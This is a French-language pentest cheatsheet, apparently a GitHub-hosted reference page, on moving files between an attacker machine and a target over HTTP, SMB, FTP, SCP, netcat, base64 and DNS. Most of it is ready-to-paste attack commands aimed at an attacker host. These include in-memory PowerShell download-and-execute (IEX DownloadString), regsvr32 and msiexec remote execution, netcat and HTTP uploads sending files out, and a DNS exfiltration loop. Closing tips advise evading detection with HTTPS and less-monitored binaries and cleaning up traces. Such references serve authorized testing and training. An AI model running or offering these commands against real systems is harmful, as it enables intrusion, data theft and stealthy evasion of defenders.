# File Transfer Cheatsheet

Référence rapide des techniques de transfert de fichiers en pentest de la machine attaquante vers la cible et inversement.


## Légende

| Symbole | Direction |
|---|---|
| `ATK → TGT` | Attaquant vers Cible (upload) |
| `TGT → ATK` | Cible vers Attaquant (download / exfiltration) |



## HTTP / HTTPS

### Serveur HTTP rapide
```bash
# Python 3
python3 -m http.server 8080

# Python 2
python2 -m SimpleHTTPServer 8080

# PHP
php -S 0.0.0.0:8080

# Ruby
ruby -run -e httpd . -p 8080
```

### Download depuis la cible

::: code-group
```bash [wget - Linux]
# ATK → TGT
wget http://<ATK>/file.txt -O /tmp/file.txt
```
```bash [curl - Linux]
# ATK → TGT
curl http://<ATK>/file.txt -o /tmp/file.txt
```
```powershell [PowerShell - Windows]
 # ATK → TGT
 Invoke-WebRequest -Uri http://<ATK>/file.txt -OutFile C:\Temp\file.txt

 # Alias court
 iwr http://<ATK>/file.txt -o C:\Temp\file.txt

 # WebClient
 (New-Object Net.WebClient).DownloadFile('http://<ATK>/file.txt','C:\Temp\file.txt')
```
```cmd [certutil - Windows]
 # ATK → TGT
 certutil -urlcache -split -f http://<ATK>/file.txt C:\Temp\file.txt
```
```cmd [bitsadmin - Windows]
 # ATK → TGT
 bitsadmin /transfer job http://<ATK>/file.txt C:\Temp\file.txt
```

:::



## SMB

### Serveur SMB (Impacket)
```bash
# Démarrer un serveur SMB
impacket-smbserver share /path/to/files -smb2support

# Avec authentification
impacket-smbserver share /path/to/files -smb2support -username user -password password
```

### Transfert via SMB

::: code-group
```cmd [Windows - Copy]
 # ATK → TGT
 copy \\<ATK>\share\file.txt C:\Temp\file.txt

 # TGT → ATK
 copy C:\Temp\file.txt \\<ATK>\share\file.txt
```
```powershell [PowerShell]
 # ATK → TGT
 Copy-Item \\<ATK>\share\file.txt C:\Temp\file.txt

 # Monter le partage
 New-PSDrive -Name Z -PSProvider FileSystem -Root \\<ATK>\share
```
```cmd [net use]
 # Monter le partage SMB
 net use Z: \\<ATK>\share /user:user password

 # Copier
 copy Z:\file.txt C:\Temp\
```

:::


## FTP

### Serveur FTP rapide
```bash
# Python pyftpdlib
pip install pyftpdlib
python3 -m pyftpdlib -p 21 -w

# Avec authentification
python3 -m pyftpdlib -p 21 -u user -P password -w
```

### Transfert via FTP

::: code-group
```bash [Linux]
 # ATK vers TGT
 ftp <ATK>
 put file.txt

 # TGT vers ATK
 ftp <ATK>
 get file.txt
```
```cmd [Windows - Script FTP]
 # Créer un script FTP
 echo open <ATK> 21> ftp.txt
 echo user anonymous>> ftp.txt
 echo binary>> ftp.txt
 echo GET file.txt>> ftp.txt
 echo bye>> ftp.txt

 # Exécuter
 ftp -s:ftp.txt
```
```powershell [PowerShell]
 # ATK → TGT
 (New-Object Net.WebClient).DownloadFile('ftp://<ATK>/file.txt','C:\Temp\file.txt')
```

:::



## SCP / SSH

::: code-group
```bash [Upload ATK → TGT]
scp file.txt user@<TGT>:/tmp/file.txt

# Répertoire entier
scp -r /path/to/dir user@<TGT>:/tmp/
```
```bash [Download TGT → ATK]
scp user@<TGT>:/tmp/file.txt /tmp/file.txt

# Répertoire entier
scp -r user@<TGT>:/tmp/dir /tmp/
```
```bash [Avec clé SSH]
scp -i id_rsa file.txt user@<TGT>:/tmp/
```
```bash [Port personnalisé]
scp -P 2222 file.txt user@<TGT>:/tmp/
```

:::



## Netcat

::: code-group
```bash [Réception TGT écoute]
# Sur la cible écoute
nc -lvnp 4444 > file.txt

# Sur l'attaquant envoie
nc <TGT> 4444 < file.txt
```
```bash [Envoi ATK écoute]
# Sur l'attaquant écoute
nc -lvnp 4444 > file.txt

# Sur la cible envoie
nc <ATK> 4444 < file.txt
```
```bash [Avec ncat]
# Réception
ncat -lvnp 4444 > file.txt

# Envoi
ncat <ATK> 4444 < file.txt
```

:::



## Base64

Utile quand les transferts binaires sont bloqués  
encode le fichier en texte.

::: code-group
```bash [Encode - Linux]
# Encoder
base64 file.txt

# Encoder vers fichier
base64 file.txt > file.b64

# Encoder binaire
base64 -w 0 binary.exe > binary.b64
```
```bash [Decode - Linux]
# Décoder
base64 -d file.b64 > file.txt

# Décoder binaire
base64 -d binary.b64 > binary.exe
```
```powershell [Encode - Windows]
# Encoder
[Convert]::ToBase64String([IO.File]::ReadAllBytes('C:\file.exe'))

# Encoder vers fichier
certutil -encode C:\file.exe C:\file.b64
```
```powershell [Decode - Windows]
# Décoder
[IO.File]::WriteAllBytes('C:\file.exe', [Convert]::FromBase64String((Get-Content 'C:\file.b64')))

# Via certutil
certutil -decode C:\file.b64 C:\file.exe
```

:::


## PowerShell
```powershell
 # DownloadFile
 (New-Object Net.WebClient).DownloadFile('http://<ATK>/file.exe','C:\Temp\file.exe')

 # DownloadString exécuter en mémoire
 IEX (New-Object Net.WebClient).DownloadString('http://<ATK>/script.ps1')

 # Invoke-WebRequest
 Invoke-WebRequest -Uri http://<ATK>/file.exe -OutFile C:\Temp\file.exe

 # Bypass SSL
 [System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}
 (New-Object Net.WebClient).DownloadFile('https://<ATK>/file.exe','C:\Temp\file.exe')

 # Upload POST
 (New-Object Net.WebClient).UploadFile('http://<ATK>/upload', 'C:\Temp\file.txt')
```


## Living off the Land  Windows

Binaires Windows natifs utilisables pour le transfert :

| Binaire | Commande |
|---|---|
| `certutil` | `certutil -urlcache -split -f http://<ATK>/file C:\Temp\file` |
| `bitsadmin` | `bitsadmin /transfer job http://<ATK>/file C:\Temp\file` |
| `curl` | `curl http://<ATK>/file -o C:\Temp\file` (Windows 10+) |
| `wget` | `wget http://<ATK>/file -O C:\Temp\file` (Windows 10+) |
| `expand` | `expand \\<ATK>\share\file.cab C:\Temp\` |
| `msiexec` | `msiexec /i http://<ATK>/file.msi` |
| `regsvr32` | `regsvr32 /s /u /i:http://<ATK>/file.sct scrobj.dll` |



## Exfiltration DNS

Utile quand seul le DNS est autorisé en sortie :
```bash
# Encoder et exfiltrer via DNS
xxd -p secret.txt | tr -d '\n' | fold -w 32 | while read line; do
  dig $line.<ATK-domain>.com @<ATK-DNS>
done

# Recevoir avec tcpdump
tcpdump -i eth0 udp port 53 -w dns_capture.pcap
```


## Wget / Curl Techniques avancées

::: code-group
```bash [Curl]
# Suivre les redirections
curl -L http://<ATK>/file -o /tmp/file

# Ignorer les erreurs SSL
curl -k https://<ATK>/file -o /tmp/file

# User-agent personnalisé
curl -A "Mozilla/5.0" http://<ATK>/file -o /tmp/file

# Upload via curl PUT
curl -T file.txt http://<ATK>/upload/
```

```bash [Wget]
# Resume download
wget -c http://<ATK>/largefile.zip

# Téléchargement récursif
wget -r http://<ATK>/directory/

```
:::


## Serveur HTTPS avec certificat auto-signé
```bash
# Générer le certificat
openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes

# Serveur HTTPS Python
python3 -c "
import http.server, ssl
server = http.server.HTTPServer(('0.0.0.0', 443), http.server.SimpleHTTPRequestHandler)
server.socket = ssl.wrap_socket(server.socket, keyfile='key.pem', certfile='cert.pem')
server.serve_forever()
"
```



::: info Tips 

- Toujours préférer **HTTPS** sur **HTTP** pour éviter la détection du contenu transféré
- `certutil` et `bitsadmin` sont souvent moins surveillés que `powershell` sur les cibles Windows
- Le transfert en **base64** contourne les filtres qui bloquent les binaires
- Utiliser `-smb2support` avec Impacket pour les cibles Windows modernes
- En cas de restriction réseau sévère, tenter le **DNS exfiltration**
- Netcat reste la méthode la plus simple et universelle en environnement Linux
- Penser à **nettoyer les fichiers** transférés après utilisation

:::


## Notes
```
 # Notes terrain
```

## Ressources

- [HackTricks  File Transfer](https://book.hacktricks.xyz/generic-methodologies-and-resources/exfiltration)
- [LOLBAS Living off the Land](https://lolbas-project.github.io/)
- [GTFOBins Linux](https://gtfobins.github.io/)



<div class="page-footer">

<span>![Last updated](https://img.shields.io/github/last-commit/Hackthus/The-Hackers-237?label=Last%20updated&style=flat-square&color=gray)</span>

<span>[![Edit this page on GitHub](https://img.shields.io/badge/✏️%20Edit%20this%20page-GitHub-black?style=flat-square&logo=github)](https://github.com/Hackthus/The-Hackers-237/edit/main/docs/cheatsheets/file-transfer.md)</span>

</div>